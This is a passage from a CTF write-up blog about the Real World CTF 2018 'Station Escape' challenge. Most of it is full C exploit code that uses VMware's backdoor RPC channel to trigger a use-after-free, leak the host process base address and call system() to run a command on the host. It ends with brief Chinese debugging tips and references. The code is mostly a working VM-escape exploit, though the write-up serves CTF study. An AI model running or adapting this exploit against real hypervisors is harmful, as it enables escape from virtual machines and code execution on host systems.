        &quot;movq %%r8,%%rbp\n\t&quot;
        &quot;add %%r12,%%rbp\n\t&quot;
        &quot;movl (%%rbp),%%ebx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0002001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;addq $4,%%r12\n\t&quot;
        &quot;cmpq %%r12,%%r11\n\t&quot;
        &quot;ja 1b\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        &quot;popq %%rbp\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
        );
}

void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%r8,%%r10\n\t&quot;
        &quot;movq %%rcx,%%r11\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0003001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        &quot;movl %%ebx,(%%r11)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;
       );

}

void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
    asm(&quot;pushq %%rbp\n\t&quot;
        &quot;movq %%r9,%%r10\n\t&quot;
        &quot;movq %%r8,%%rbp\n\t&quot;
        &quot;movq %%rcx,%%r11\n\t&quot;
        &quot;movq $1,%%rbx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0004001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;in %%dx,%%eax\n\t&quot;
        &quot;add %%r11,%%rbp\n\t&quot;
        &quot;movl %%ebx,(%%rbp)\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        &quot;popq %%rbp\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
       );
}

void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rcx,%%r10\n\t&quot;
        &quot;movq $0x1,%%rbx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0005001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}
void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rcx,%%r10\n\t&quot;
        &quot;movq $0x21,%%rbx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0005001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}
void channel_close(int cookie1,int cookie2,int channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rcx,%%r10\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0006001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}
struct channel{
    int cookie1;
    int cookie2;
    int num;
};
uint64_t heap =0;
uint64_t text =0;
void run_cmd(char *cmd){
    struct channel tmp;
    int res,len,i;
    char *data;
    channel_open(&amp;tmp.cookie1,&amp;tmp.cookie2,&amp;tmp.num,&amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd),&amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_send_data(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd)+0x10,cmd,&amp;res);

    channel_recv_reply_len(tmp.cookie1,tmp.cookie2,tmp.num,&amp;len,&amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&lt;len+0x10;i+=4){
        channel_recv_data(tmp.cookie1,tmp.cookie2,tmp.num,i,data,&amp;res);
    }
    printf(&quot;recv data:%s\n&quot;,data);
    channel_recv_finish(tmp.cookie1,tmp.cookie2,tmp.num,&amp;res);
    if(!res){
        printf(&quot;fail to recv finish\n&quot;);
    }

    channel_close(tmp.cookie1,tmp.cookie2,tmp.num,&amp;res);
    if(!res){
        printf(&quot;fail to close channel\n&quot;);
        return;
    }
}
void leak(){
    struct channel chan[10];
    int res=0;
    int len,i;  
    char pay[8192];
    char *s1 = &quot;info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;
    char *data;
    char *s2 = &quot;info-get guestinfo.a&quot;;
    char *s3 = &quot;1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;
    char *s4 = &quot;tools.capability.dnd_version 4&quot;;
    char *s5 = &quot;vmx.capability.dnd_version&quot;;
    //init data
    run_cmd(s1); // set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);
    run_cmd(s4);


    //first step 
    channel_open(&amp;chan[0].cookie1,&amp;chan[0].cookie2,&amp;chan[0].num,&amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&amp;res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;len,&amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&lt;len+0x10;i++){
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;res);
    }
    printf(&quot;recv data:%s\n&quot;,data);
    //second step free the reply and let the other channel get it.

    channel_open(&amp;chan[1].cookie1,&amp;chan[1].cookie2,&amp;chan[1].num,&amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2),&amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }

    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2)-4,s2,&amp;res);
    if(!res){
        printf(&quot;fail to send data\n&quot;);
        return;
    }

    //free the output buffer
    printf(&quot;Freeing the buffer....,bp:0x5555556DD3EF\n&quot;);
    getchar();
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;res);
    if(!res){
        printf(&quot;fail to recv finish1\n&quot;);
        return;
    }
    //finished sending the command, should get the freed buffer
    printf(&quot;Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n&quot;);
    getchar();
    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,4,&amp;s2[16],&amp;res);
    if(!res){
        printf(&quot;fail to send data\n&quot;);
        return;
    }

    //third step,free it again
    //set status to be 4
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;len,&amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);

    //free the output buffer
    printf(&quot;Free the buffer again...\n&quot;);
    getchar();
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;res);
    if(!res){
        printf(&quot;fail to recv finish2\n&quot;);
        return;
    }

    printf(&quot;Trying to reuse the buffer as a struct, which we can leak..\n&quot;);
    getchar();
    run_cmd(s5);
    printf(&quot;Should be done.Check the buffer\n&quot;);
    getchar();

    //Now the output buffer of chan[1] is used as a struct, which contains many addresses
    channel_recv_reply_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,&amp;len,&amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }


    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&lt;len+0x10;i+=4){
        channel_recv_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,i,data,&amp;res);
    }
    printf(&quot;recv data:\n&quot;);
    for(i=0;i&lt;len;i+=8){
        printf(&quot;recv data:%lx\n&quot;,*(long long *)&amp;data[i]);
    }
    text = (*(uint64_t *)data)-0xf818d0;

    printf(&quot;Leak Success\n&quot;);
}

void exploit(){
    //the exploit step is almost the same as the leak ones
    struct channel chan[10];
    int res=0;
    int len,i;
    char *data;
    char *s1 = &quot;info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;;
    char *s2 = &quot;info-get guestinfo.b&quot;;
    char *s3 = &quot;1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;;
    char *s4 = &quot;gnome-calculator\x00&quot;;
    uint64_t pay1 =text+0xFE95B8; 
    uint64_t pay2 =text+0xECFD0; //system
    uint64_t pay3 =text+0xFE95C8;
    char *pay4 = &quot;gnome-calculator\x00&quot;;
    run_cmd(s1);
    channel_open(&amp;chan[0].cookie1,&amp;chan[0].cookie2,&amp;chan[0].num,&amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&amp;res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;len,&amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&lt;len+0x10;i+=4){
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;res);
    }
    printf(&quot;recv data:%s\n&quot;,data);
    channel_open(&amp;chan[1].cookie1,&amp;chan[1].cookie2,&amp;chan[1].num,&amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_open(&amp;chan[2].cookie1,&amp;chan[2].cookie2,&amp;chan[2].num,&amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_open(&amp;chan[3].cookie1,&amp;chan[3].cookie2,&amp;chan[3].num,&amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;res);
    if(!res){
        printf(&quot;fail to recv finish2\n&quot;);
        return;
    }
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s3),&amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    printf(&quot;leak2 success\n&quot;);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;len,&amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;res);
    if(!res){
        printf(&quot;fail to recv finish2\n&quot;);
        return;
    }
    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,8,&amp;pay1,&amp;res);
    channel_set_len(chan[2].cookie1,chan[2].cookie2,chan[2].num,strlen(s3),&amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_set_len(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(s3),&amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;pay2,&amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;pay3,&amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(pay4)+1,pay4,&amp;res);
    run_cmd(s4);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
}
void main(){
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    setvbuf(stdin,0,2,0);
    leak();
    printf(&quot;text base :%p&quot;,text);
    exploit();
}   
</code></pre>

<p>Enjoy your calculator:)
<img alt="" src="/assets/images/backup/realworldctf_2018_stationescape/d46yMQQ.png" /></p>
<h2 id="_3">关于调试</h2>
<p>调试有点小技巧需要说明一下。首先就是正常的把<code>vmware</code>开起来，然后在<code>host</code>用<code>gdb</code>来<code>attach</code>上去。这个时候我们会下断点，然后继续运行，进入虚拟机<code>guest</code>里面跑<code>exploit</code>脚本。但大家想一下，如果你还在<code>guest</code>里面的时候，<code>host</code>的<code>gdb</code>遇到了断点，会怎样？
因为<code>gdb</code>遇到了断点，那么<code>guest</code>就被停住了。然而你还在<code>guest</code>里面，你就没有办法按<code>ctrl+alt</code>切出来了，就像被人放了一招<code>时间停止</code>一样。这个时候你除了含泪强制关机之外没有什么好办法。所以大家在调试的时候记得现在exp开头加个<code>sleep</code>,然后在<code>sleep</code>的时候赶紧把鼠标切出来到<code>host</code>中。这样就可以正常调试了。(PS:好像<code>mac</code>不会有这个问题，因为<code>mac</code>可以直接用触摸板切出来?)</p>
<h2 id="_4">相关材料</h2>
<p>题目相关材料：</p>
<blockquote>
<p>题目操作系统：Ubuntu x64 1804
目标VMWare Workstation：VMware-Workstation-Full-15.0.2-10952284.x86_64.bundle，https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp
patched VMX：https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E</p>
</blockquote>
<p>一些参考资料：</p>
<blockquote>
<p>https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware
https://www.52pojie.cn/thread-783225-1-1.html
https://sites.google.com/site/chitchatvmback/backdoor</p>
</blockquote>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../../blockchain/email_bot/" title="email bot" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                email bot
              </span>
            </div>
          </a>
        
        
          <a href="../gitpage_fuck/" title="gitpage采坑" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                gitpage采坑
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2019- 2020 b1b1@r3kapig
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.c648116f.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
    
  </body>
</html>